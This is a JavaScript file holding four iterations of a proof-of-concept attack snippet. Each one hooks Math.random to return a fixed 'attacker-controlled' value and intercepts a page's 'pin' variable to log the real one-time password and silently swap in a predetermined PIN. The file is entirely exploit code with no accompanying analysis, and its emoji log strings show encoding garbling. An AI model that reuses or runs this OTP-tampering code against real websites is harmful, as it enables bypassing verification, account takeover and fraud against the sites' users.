// Step 3a: Hook Math.random to log predictable value
Math.random = function () {
    const fakeRandom = 0.12345678; // Fixed value, just for POC
    console.log("Math.random intercepted. Returning predictable value:", fakeRandom);
    return fakeRandom;
};

// Step 3b: Hijack the OTP value itself if available
Object.defineProperty(window, 'pin', {
    set(value) {
        console.log("OTP Intercepted before sending:", value);
        // Store to window so we can use it later
        window.interceptedOTP = value;
    },
    get() {
        return window.interceptedOTP;
    }
});




// Step 1: Store the original Math.random
const originalRandom = Math.random;

// Step 2: Override Math.random to log and store real value
let realRandomValue = null;
Math.random = function () {
    realRandomValue = originalRandom(); // Call real random
    console.log("‚úÖ Real Math.random value:", realRandomValue);
    return 0.12345678; // Return attacker-controlled fake value
};

// Step 3: Intercept and override the OTP
Object.defineProperty(window, 'pin', {
    set(value) {
        console.log("‚ö†Ô∏è Original OTP (from real Math.random):", value);
        const attackerOTP = 21111110; // Your fake predictable OTP
        console.log("üö® Replacing OTP with attacker-controlled value:", attackerOTP);
        window.interceptedOTP = attackerOTP; // Replace it silently
    },
    get() {
        return window.interceptedOTP;
    }
});





// Step 1: Store the original Math.random
const originalRandom = Math.random;

// Step 2: Hook Math.random to log real decimal and calculated PIN
let realRandomValue = null;
let calculatedRealPIN = null;

Math.random = function () {
    realRandomValue = originalRandom(); // Actual random decimal
    calculatedRealPIN = Math.floor(10000000 + realRandomValue * 90000000);
    console.log("‚úÖ Real Math.random decimal:", realRandomValue);
    console.log("üîç Original PIN ID (generated from real random):", calculatedRealPIN);
    return 0.12345678; // Fake attacker-controlled value
};

// Step 3: Intercept and override the 'pin' variable
Object.defineProperty(window, 'pin', {
    set(value) {
        const fakePIN = 21111110;
        console.log(`üö® Replacing original PIN ID (${calculatedRealPIN}) with fake PIN ID (${fakePIN})`);
        window.interceptedOTP = fakePIN;
    },
    get() {
        return window.interceptedOTP;
    }
});




// Step 1: Store the original Math.random
const originalRandom = Math.random;

// Step 2: Hook Math.random to log real decimal and calculated PIN
let realRandomValue = null;
let calculatedRealPIN = null;

Math.random = function () {
    realRandomValue = originalRandom(); // Actual random decimal
    calculatedRealPIN = Math.floor(10000000 + realRandomValue * 90000000);
    console.log("‚úÖ Real Math.random decimal:", realRandomValue);
    console.log("üîç Original PIN ID (generated from real random):", calculatedRealPIN);
    return 0.12345678; // Fake attacker-controlled value
};

// Step 3: Intercept and override the 'pin' variable
Object.defineProperty(window, 'pin', {
    set(value) {
        const fakePIN = 21111110;

        // Only log if calculatedRealPIN is available
        if (calculatedRealPIN !== null) {
            console.log(`üö® Replacing original PIN ID (${calculatedRealPIN}) with fake PIN ID (${fakePIN})`);
        } else {
            console.log(`üö® Setting fake PIN ID (${fakePIN}) without real PIN context`);
        }

        window.interceptedOTP = fakePIN;
    },
    get() {
        return window.interceptedOTP;
    }
});

